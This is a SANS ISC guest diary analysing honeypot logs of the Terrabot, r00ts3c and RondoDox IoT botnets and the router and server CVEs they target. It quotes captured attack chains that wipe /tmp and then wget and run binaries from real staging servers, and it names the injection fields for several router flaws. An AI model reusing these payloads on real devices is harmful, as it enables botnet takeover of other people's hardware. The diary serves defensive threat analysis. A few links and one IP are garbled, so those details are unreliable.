---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-06-27T04:06:54.873035+00:00'
exported_at: '2026-06-27T04:06:57.927408+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/33104
structured_data:
  about: []
  author: ''
  description: 'What do Ports Hear When Nobody''s Listening? An Assessment of Automated
    Cybercrime [Guest Diary], Author: Guy Bruneau'
  headline: What do Ports Hear When Nobody's Listening&#x3f; An Assessment of Automated
    Cybercrime &#x5b;Guest Diary&#x5d;, (Wed, Jun 24th)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/33104
  publisher:
    logo: /favicon.ico
    name: GTCode
title: What do Ports Hear When Nobody's Listening&#x3f; An Assessment of Automated
  Cybercrime &#x5b;Guest Diary&#x5d;, (Wed, Jun 24th)
updated_at: '2026-06-27T04:06:54.873035+00:00'
url_hash: 52ef9898dcb16986b7d8cff9809a56e5bf8411aa
---

[This is a Guest Diary by Nicole Phillips, an ISC intern as part of the
[SANS.edu](https://www.sans.edu/cyber-security-programs/bachelors-degree/)
BACS program]

"
*I was just sitting here enjoying the company. Plants got a lot to say, if you take the time to listen.*
"

— Eeyore, Winnie the Pooh

**Introduction: Listening to the Static**

Setting up and contributing to the DShield honeypot project [
[1](https://isc.sans.edu/honeypot.html)
] as an ISC intern is a meaningful part of the BACS program at SANS [2]. Over the last several months I've been thrilled to observe real-time SSH/Telnet activity, check every new file hash and TTY log and hunt for unique http requests. That said, reviewing raw honeypot logs can feel overwhelming. Every day, public facing servers are bombarded by millions of identical hits, mostly automated, creating a fog of noise that seems repetitive, yet disconnected and chaotic. After seeing the same sequence of activity day in and day out, it becomes easy to dismiss traffic as loud background static.

But like Eeyore's observation of the Hundred Acre Wood, the background noise has a lot to say if you stop to listen. Witnessing the noise helps you understand how to recognize the anomalies. When slowing down and looking more closely at patterns, the fog lifts, revealing layers of orchestration in an automated shadow economy that increasingly drives my curiosity.

• What are automated botnets and scanners?

• How do they operate?

• What are they looking for?

• What or who operates behind the scenes, and how mature are their engineering tactics?

While I'm unable to fully answer these questions, I will try to deconstruct some of the malicious automated background noise at several tiers, tracing its trajectory from low-level mechanical slips and overlaps to human-mimicking deception.

A note on attribution: The assessment that follows references each operation based on its observed "User-Agent" identifier to cluster specific infrastructure and automated behavior; it does not imply definitive attribution of the activity to the original botnet developers.

**The Commodity Layer: Surface Noise**

Much of the malicious noise consists of bots and automated scripts scanning blindly for vulnerable IoT devices. These are the weeds of this ecosystem, initially ignored, until one day the entire garden is overrun. In the digital space, this appears as low-level static. It's easy to assume that exploits will reveal themselves out of the static through standard telemetry. I've learned through this internship, however, that malicious activity at this layer is much simpler. Attackers are not knocking down doors; they are walking right through them. Because so much of network defense is inherently reactive, a lot of this activity simply gets missed.

While the operators exhibit technical limitations and sloppy mistakes, they succeed because they are paying attention. Through automation, mass trial and error campaigns, and volume that outpaces patching and CVEs, these operators can find and weaponize simple gaps that go unnoticed. My web honeypot captured traffic that illustrates this dynamic.

**Terrabot: The Disposable Swarm**

TerraBot is an aggressive IoT botnet variant derived from Mirai and Gafgyt source code frameworks that scans the internet for exploits to weaponize and build its network of compromised devices [
[3](http://https://www.socdefenders.ai/threats/07c347ba-6a9c-44bc-956d-5dde426c673d)
]. The User-Agent string, terrabot-owned-you appears repeatedly in my logs. Between May 28 and June 9 my honeypot saw 24 hits from 24 unique IPs, all with the same User-Agent string.

The vast majority – 17 of the 24 hits – targeted the /GponForm/diag\_Form?images/ endpoint, while 6 hits delivered a payload targeting a known unauthenticated command injection vulnerability affecting legacy D-Link DSL gateway routers (
[CVE-2016-20017)](https://nvd.nist.gov/vuln/detail/cve-2016-20017)
using a staging server at hxxp://140[.]233.190, 47.as shown below:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic1.png)

Figure 1: Terrabot payload attempting unauthenticated command injection against legacy D-Link DSL routers (
[CVE-2016-20017](https://nvd.nist.gov/vuln/detail/cve-2016-20017)
)

Interestingly, Terrabot's automation failures begin with the first hit in my logs, a POST request to /GponForm/diag\_Form?images/ attempting to exploit an authentication bypass flaw (
[CVE-2018-10561](https://nvd.nist.gov/vuln/detail/cve-2018-10561)
) in Dasan GPON routers.  While the logs show the correctly formatted URL string, the exploit requires the POST action to actively inject the malicious payload into the router's ping diagnostic tool via the request body. My logs show each of these hits as entirely empty. This botnet was not performing reconnaissance; it was shooting blanks. Activity against these two endpoints continued over the next 11 days, always from unique IPs.

Terrabot's campaign ends with a stand-alone event that further confirms its brokenness. On June 9,  the following request hit from source IP:
176.116.165.207
:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic2.png)

The payload above targets a well-known unauthenticated remote code execution (RCE) backdoor found in legacy MVPower CCTV DVRs, commonly known as the JAWS Webserver RCE (CVE-2016-20016), exploited in the wild between 2017 and 2022. The "JAWS" reference relates to the embedded JAWS web-server and self-identification in HTTP response headers.

Had the request been correctly formatted, the /shell endpoint would have executed in the device's root terminal as follows:

• cd /tmp; rm -rf \* -
**Eviction**
: the bot clears out temporary memory to aggressively wipe out competing malware strains or previous installs

• wget+140.233.190.47/jaws -
**Staging Endpoint**
: the device reaches out to fetch the jaws binary, hosted on a known malicious endpoint

• chmod 777 jaws; sh jaws; ./jaws -
**Execution**
: this forces max permissions and attempts to execute the payload simultaneously as both a shell script and compiled binary to ensure successful takeover.

This exploit failed due to a simple formatting bug. The script author inserted an unencoded, raw space character directly after wget+ instead of standard URL encoding, causing the web server to reject the request. In HTTP protocol formatting, a single blank space acts as a delimiter separating the URI path from the HTTP Version string. Because of this unencoded space, the honeypot immediately rejected the connection with a 400 Bad Request Syntax error, highlighting sloppy, copy-pasted scripting templates that break due to simple human errors.

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic3.png)

Figure 2: Wireshark stream showing honeypot returning HTTP 400 Bad Request syntax error

After a short burst of static, this event on June 9, 2026 is the last appearance of Terrabot in my logs. That said, its presence on the /login.cgi?cli=... endpoint marks the spot where it crossed paths with a more structurally sound campaign.

**r00ts3c: The Tactical Shift**

A second familiar string appears across my logs: r00ts3c-owned-you, and traces back to June 6, 2026, with the first hit from source IP
124.71.175.215
. Same naming convention as Terrabot, same Mirai lineage, but a different target. This one has a detail buried in the infrastructure that complicates the "commodity" label.

The activity begins on June 6 with a generic entry point: a direct request to a hardcoded debugging console backdoor shell to the hxxp://
176[.]65.149.168
staging server to fetch kaizen.arm, a binary specifically targeting ARM processors.

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic4.png)

Figure 3: Initial r00ts3c entry attempting to fetch and execute the kaizen.arm binary via a debugging console backdoor

The command string above is broken down as follows:

• GET /shell? -
**Entry**
: The entry point debugging console

• cd /tmp; rm -rf \* -
**Mass Eviction**
: Like Terrabot, this wipes everything. We will see shortly why this is interesting.

• wget hxxp://176[.]65.149.168/bins/kaizen.arm -
**Staging Endpoint**
: Fetches the kaizen.arm payload from a remote staging server

• chmod 777 kaizen.arm; ./kaizen.arm -
**Execution**
: Sets execution permissions and runs the binary.

Two days later on June 8, the activity continues with two POST requests to /UD/?9 and /UD/act?1, which are control endpoints for many consumer routers that use SOAP to communicate over HTTP [
[4](https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/)
]. Both requests contain the same staging server as the previous:

On the same day, the next request hits /tmUnblock.cgi, a CGI endpoint in Linksys E-series routers carrying a critical command injection vulnerability (
[CVE-2025-34037](https://nvd.nist.gov/vuln/detail/CVE-2025-34037)
). While documented since 2013 and historically exploited by "TheMoon" worm, this vulnerability continues to be actively weaponized by modern botnets [
[8](https://www.sentinelone.com/vulnerability-database/cve-2025-34037/)
].

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic5.png)

Figure 4: r00ts3c targeting SOAP-based /UD router control endpoints using the primary 176.65.149.168 staging server.

SANS ISC has been tracking the vulnerability since Feb 2014 [
[7](https://isc.sans.edu/diary/17633)
], and this specific endpoint since September 2019. The following POST request is from source IP
119.96.223.148
out of Wuhan, China:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic6.png)

Figure 5: r00ts3c payload targeting Linksys routers (
[CVE-2025-34037](https://nvd.nist.gov/vuln/detail/CVE-2025-34037)
). Note the hardcoded
188.166.41.194
DigitalOcean IP in the HTTP Host header.

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic7.png)

Here, the injection occurs in the ttcp\_ip field, which is a router diagnostic parameter expecting an IP address for TCP throughput testing. Passing -h gives it an invalid value, causing the utility to fail and triggering the shell to move to the backtick-wrapped command chain:

• cd /tmp; rm -rf kaizen.mpsl -
**Targeted eviction**
: Where Terrabot's final hit ran rm -rf \* and wiped everything, this removes only the kaizen binary, leaving other resident malware untouched and reducing noise on the compromised device. Note that on it's first hit, r00ts3c also wiped everything.

• wget hxxp://176[.]65.149.168/bins/kaizen.mpsl -
**Staging Endpoint**
: Fetches the new kaizen.mpsl payload from a remote staging server

• chmod 777 kaizen.mpsl; ./kaizen.mpsl linksys -
**Execution**
: Sets execution permissions and runs the binary with "linksys" passed as a runtime argument

The .mpsl extension identifies a MIPS Little Endian compiled binary, the architecture inside Linksys E-series hardware and a payload built specifically for this target class.

Despite this tactical maturity in payload management, a closer look at the raw HTTP headers reveals the same sloppy engineering. In the June 8 request from the Wuhan node shown above, the HTTP Host header reads: "Host":"
188.166.41.194
:80".

In a properly formatted request, the Host header should reflect the IP address of the destination server (my honeypot IP). Instead, this bot is broadcasting the IP address of a completely unrelated DigitalOcean server.  This hard-coding error is a recurring theme here. In other instances with r00ts3c, as well as Terrabot's JAWS attempt, the header is hardcoded as Host: 127.0.0.1:80, the loopback address used for local building and sandbox testing. The operators failed to configure these variables before releasing the bots, demonstrating hastily assembled and structurally flawed delivery systems.

Wrapping up June 8, we see one final POST request, specifically targeting CVE-2016-20017, coming from source IP 20.210.107.25, with a nearly identical payload as Terrabot's D-Link campaign:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic8.png)

Figure 6: r00ts3c D-Link exploit attempt (CVE-2016-20017) originating from Microsoft Azure cloud infrastructure.

The 20.x IP belongs to Microsoft Azure. The geolocation points to an anonymous fallback for cloud infrastructure that cannot be resolved to a specific location (the literal geographic center of the United States).

For the next 6 days, r00ts3c was silent, picking up again on June 14, from the same
20.210.107.25
IP, only this time targeting the /tmUnblock.cgi endpoint on port 80. Four more hits followed over the next 24 hours, repeating the /UD endpoints and pointing to the same staging server. On June 17, the bot seemed to loop back to the initial request seen on June 6, only this time from an IP out of Ukraine, pointing to a new staging server: itself, at hxxp://
83.142.209.46
, also fetching the kaizen.arm binary. The following day, the Azure node strikes again, essentially returning to hit the /shell backdoor one last time. This final request reverted to the original script, attempting to fetch kaizen.arm from the primary staging server at hxxp://
176.65.149.168
.

Ultimately, this single Ukraine P2P entry demonstrates that embedded within the background noise are the structural indicators of how the automated botnets adapt, decentralize and survive.

**rondo (aka: RondoDox): The Deep Precursor**

Almost a month before r00ts3c appeared in my logs, a different operator found the perimeter. However, parsing earlier logs revealed that the rondo infrastructure had been silently active since as early as May 2. These logs reveal that the "commodity noise" may often mask highly sophisticated, enterprise-grade attacks.

This campaign, tracked by the threat intelligence community as the RondoDox botnet[
[5](http://https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis)
], unfolded across three distinct phases in my logs.

**Phase 1: The Enterprise &amp; AI Shotgun**

Source IP:
124.198.131.185 | C2: 45.92.1.50

The first 8 hits from this campaign originated from source IP 124.198.131.185 (Spark New Zealand). During this first phase, the operator targeted high-value enterprise and AI frameworks, utilizing a primary staging server located at hxxp://
45[.]92.1.50
.

These initial hits highlight a more sophisticated execution chain:

•
**Log4Shell WAF Evasion**
(
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)
): The attacker utilized environment variable manipulation within the User-Agent string to successfully bypass basic Web Application

Firewalls. The end of the string contains a Base64 encoded command. Decoding it reveals the fileless execution payload:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic9.png)

•
**The Header Spray**
: Reviewing the JSON logs from the early May events reveals more characteristics of automated broad-spectrum scanning. In addition to dropping the exploit into the

User-Agent string, rondo maximized probability of success by forcing the obfuscated exploit into every possible HTTP header:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic10.png)

•
**ShadowRay**
(
[CVE-2023-48022](https://nvd.nist.gov/vuln/detail/cve-2023-48022)
): Along with the Tomcat attacks, rondo launched targeted hits against the /api/jobs/ endpoint, mimicking standard interactions via python-requests while deploying the fileless loader payload string rondo.wfh.sh directly into memory:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic11.png)

**Phase 2: The Infrastructure Shift**

Source IP:
124.198.131.185 | C2: 204.10.194.134

After the first 8 hits between May 2 and May 3, a clean structural break occurred, and the botnet was silent until May 16, when it resurfaced and fired 5 more hits between May 16 and May 17. While the source IP remained identical, the C2 shifted to a new staging server at hxxp://204[.]10.194.134.

rondo also pivoted away from enterprise exploits, firing a succession of command injection attacks at several consumer-grade router interfaces:

•
**LB-LINK Command Injection**
(
[CVE-2023-26801](https://nvd.nist.gov/vuln/detail/CVE-2023-26801)
): Discovered in March 2023 and still active, this vulnerability allows an attacker to execute commands on the device by sending

crafted HTTP POST requests to the /goform/set\_LimitClient\_cfg URL. By setting the "time1" and "time2" fields to "00:00-00:00" and injecting arbitrary commands into the "mac" field, an attacker may then execute the command chain on the device.

•Decoded log payload:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic12.png)

•
**ASUS AsusWRT NVRAM Manipulation**
(
[CVE-2018-6000](https://nvd.nist.gov/vuln/detail/cve-2021-44228)
):  An unauthenticated attacker may enable a hidden background debugging console by submitting a POST request to the /vpnupload.cgi endpoint, allowing arbitrary command execution.

• DShield form data payload: name=\"ateCommand\_flag\"\r\n\r\n1

This mid-campaign rotation proves that even commodity botnets possess centralized coordination, updating the configuration of infected edge devices on the fly without needing to re-compromise them.

**Phase 3: The Residential Drift**

Source IP:
124.198.131.22 | C2: 204.10.194.134

The final 8 hits of the campaign demonstrate the physical constraints of operating a botnet through consumer hardware. The activity was silent for about 10 days after the last hit on May 17. When it picked back up on May 28, the source IP shifted its last octet to
124.198.131.22
, reflecting a standard DHCP lease renewal within the same residential IP pool.

Between May 28 and May 29, 8 hits from this new IP targeted two specific endpoints: the legacy Linksys /tmUnblock.cgi interface and the LB-LINK /goform/set\_LimitClient\_cfg endpoint, drawing payloads from the secondary
204.10.194.134
server.

The target is the same /tmUnblock.cgi endpoint seen with r00ts3c. The query string carries the same base64 value:
L3RtVW5ibG9jay5jZ2k=
, which decodes to /tmUnblock.cgi, pointing to a shared underlying scanner template.

The rondo payload, however, is again fileless:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic13.png)

After the IP shift, the timing intervals between the final hits were highly irregular, ranging from two to six hours apart and occurred exclusively during local waking hours in Auckland (NZST, UTC+12).

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic14.png)

1: RondoDox Phase 3 scanning activity (Source IP:
124.198.131.22
) correlated with local waking hours in Auckland, New Zealand (NZST).

All of these hits reflect waking household hours in Auckland, with zero overnight activity. Here, the bandwidth constraints, connectivity interruptions, and activity patterns of a real household bleed into the attack data.

The device in Auckland is not server infrastructure rondo provisioned. It is a victim, now scanning for more victims exactly like itself. This is the Mirai replication loop in concrete log data: Router gets compromised → router becomes scanner → scanner hunts routers → repeat.

The botnet is residential infrastructure, not routed through it. The owner of that Auckland router has no idea that their device spent late May probing a Linksys vulnerability between noon and midnight. The irregular scan timing is simply a household schedule leaking through a compromised gateway.

**Conclusion: The Depth of the Noise**

Eeyore was right: the background has a lot to say. Across this 30-day observation window, the commodity threat layer showed that it is not monolithic. To dismiss automated scans as simple background static is to overlook a competitive, multi-tiered system running continuously beneath the surface of normal network activity, a shadow economy with its own supply chains, infrastructure patterns, and operational rhythms.

At the surface, we find campaigns like Terrabot and r00ts3c, scanning for and blasting decades old CVEs with flawed scripts and clumsy engineering. Deeply beneath lies RondoDox, aggressively gathering exploits that target a large range of systems, from consumer-grade hardware to enterprise web-servers and AI frameworks, systematically deploying sophisticated fileless exploit chains while running off of compromised home routers [
[6](https://www.securityweek.com/rondodox-botnet-targeted-174-vulnerabilities/)
].

Threat actors are fundamentally efficient. They do not segment their operations into neat "commodity" or "advanced" categories.  They use the exact same disposable infrastructure to scan the entire internet, relying on the persistent gap between what our systems check and what they assume. Ultimately, they don't need sophisticated exploits to inflict damage but weaponize simplicity and high-volume automation that outpaces mitigation.

For network defenders and analysts, it's important to understand the depth of the noise and how it should be treated. Observing patterns and structural shifts within the static is essential for keeping pace with an automated, multi-directional threat that never stops running. The infrastructure persists, campaigns evolve, payloads update, and the ports keep listening.

[1] https://isc.sans.edu/honeypot.html

[2] https://www.sans.edu/cyber-security-programs/bachelors-degree/

[3] https://www.socdefenders.ai/threats/07c347ba-6a9c-44bc-956d-5dde426c673d

[4] https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/

[5] https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis

[6] https://www.securityweek.com/rondodox-botnet-targeted-174-vulnerabilities/

[7] https://isc.sans.edu/diary/17633

[8] https://www.sentinelone.com/vulnerability-database/cve-2025-34037/

Disclosure: Gemini supported polish and grammar checks, certain technical explanations, and assistance with locating hard-to-find sources. All such links, source material and commands were independently verified, while all research, event discovery and authorship remain my own.

-----------

Guy Bruneau
[IPSS Inc.](http://www.ipss.ca/)

[My GitHub Page](https://github.com/bruneaug/)

Twitter:
[GuyBruneau](https://twitter.com/guybruneau)

gbruneau at isc dot sans dot edu